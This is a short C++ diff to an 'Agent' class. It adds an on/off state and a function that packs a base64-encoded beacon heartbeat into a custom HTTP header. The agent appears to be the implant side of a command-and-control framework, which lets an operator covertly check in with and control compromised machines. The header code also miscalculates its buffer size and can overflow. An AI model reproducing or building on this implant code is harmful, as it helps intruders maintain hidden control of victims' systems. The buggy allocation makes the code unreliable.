@@ -20,6 +20,18 @@ Agent::Agent()
 
 	memorysaver  = (MemorySaver*)MemAllocLocal(sizeof(MemorySaver));
 	*memorysaver = MemorySaver();
+
+	this->config->active = true;
+}
+
+void Agent::SetActive(bool state)
+{
+	this->config->active = state;
+}
+
+bool Agent::IsActive()
+{
+	return this->config->active;
 }
 
 LPSTR Agent::BuildBeat()
@@ -62,4 +74,21 @@ LPSTR Agent::BuildBeat()
 	LPSTR encoded_beat = b64_encode(beat, beat_size);
 
 	return encoded_beat;
+}
+
+LPSTR Agent::CreateHeaders()
+{
+	LPSTR beat = this->BuildBeat();
+	ULONG beat_length = StrLenA(beat);
+	ULONG param_length = StrLenA((CHAR*)this->config->param_name);
+
+	CHAR* HttpHeaders = (CHAR*)MemAllocLocal(beat_length + beat_length + 5);
+	memcpy(HttpHeaders, this->config->param_name, param_length);
+	ULONG index = param_length;
+	memcpy(HttpHeaders + index, ": ", 2);
+	index += 2;
+	memcpy(HttpHeaders + index, beat, beat_length);
+	index += beat_length;
+	memcpy(HttpHeaders + index, "\r\n", 3);
+	return HttpHeaders;
 }
